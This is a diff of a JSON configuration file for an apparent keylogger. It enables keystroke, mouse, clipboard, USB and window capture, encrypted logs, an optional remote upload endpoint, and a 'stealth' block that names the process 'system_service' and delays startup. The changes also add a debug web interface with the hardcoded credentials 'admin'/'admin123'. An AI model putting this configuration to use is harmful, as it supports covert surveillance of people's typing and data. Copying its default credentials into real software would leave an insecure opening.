@@ -1,77 +1,89 @@
 {
   "logging": {
     "level": "INFO",
-    "file_path": "keylog.txt",
-    "max_file_size_mb": 100,
-    "backup_count": 5,
-    "buffer_size": 10,
-    "flush_interval_seconds": 10
+    "file_path": "logs/keylog.txt",
+    "max_size_mb": 100,
+    "buffer_size": 100,
+    "flush_interval": 5.0,
+    "enable_rotation": true,
+    "enable_encryption": true,
+    "backup_count": 5
   },
   "encryption": {
     "enabled": true,
-    "key_file": "encryption.key",
-    "algorithm": "fernet"
+    "key_file": "keys/encryption.key",
+    "algorithm": "AES-256-GCM"
   },
   "features": {
-    "key_logging": true,
-    "mouse_logging": true,
-    "clipboard_logging": true,
-    "screenshots": true,
+    "keyboard": true,
+    "mouse": true,
+    "clipboard": true,
+    "screenshots": false,
     "usb_monitoring": true,
-    "network_logging": false,
-    "window_tracking": true
+    "network_monitoring": false,
+    "window_tracking": true,
+    "performance_monitoring": true
   },
   "privacy": {
     "sanitize_passwords": true,
     "hash_sensitive_data": true,
-    "max_clipboard_length": 1000,
+    "clipboard_max_length": 1000,
     "excluded_applications": [
-      "KeePass",
-      "1Password",
-      "Bitwarden",
-      "LastPass"
+      "password_manager.exe",
+      "keepass.exe",
+      "1password.exe",
+      "bitwarden.exe"
     ],
     "sensitive_keywords": [
       "password",
+      "passwd",
+      "pwd",
       "ssn",
+      "social security",
       "credit card",
-      "social security"
+      "card number",
+      "cvv",
+      "pin",
+      "secret"
     ]
   },
   "performance": {
-    "screenshot_interval_seconds": 30,
-    "window_check_interval_seconds": 5,
-    "clipboard_check_interval_seconds": 3,
+    "screenshot_interval": 300,
+    "window_check_interval": 1.0,
+    "clipboard_check_interval": 0.5,
     "max_memory_usage_mb": 500,
     "thread_pool_size": 4
   },
-  "remote_logging": {
+  "remote": {
     "enabled": false,
     "server_url": "https://your-server.com/api/logs",
     "api_key": "",
-    "batch_size": 50,
-    "retry_attempts": 3,
-    "timeout_seconds": 30
+    "upload_interval": 3600,
+    "compress_uploads": true
   },
   "alerts": {
     "email_enabled": false,
-    "email_recipient": "",
-    "smtp_server": "",
-    "smtp_port": 587,
-    "smtp_username": "",
-    "smtp_password": ""
+    "email_smtp_server": "smtp.gmail.com",
+    "email_smtp_port": 587,
+    "email_username": "",
+    "email_password": "",
+    "email_to": "",
+    "alert_on_startup": true,
+    "alert_on_errors": true
   },
-  "stealth_mode": {
-    "enabled": false,
-    "hide_console": true,
-    "run_as_service": false
+  "stealth": {
+    "hide_console": false,
+    "process_name": "system_service",
+    "startup_delay": 30,
+    "auto_start": false
   },
-  "web_interface": {
-    "enabled": false,
+  "web": {
+    "enabled": true,
     "host": "127.0.0.1",
-    "port": 8080,
-    "auth_required": true,
+    "port": 5000,
+    "debug": true,
     "username": "admin",
-    "password_hash": ""
+    "password": "admin123",
+    "secret_key": "your-secret-key-here"
   }
 }
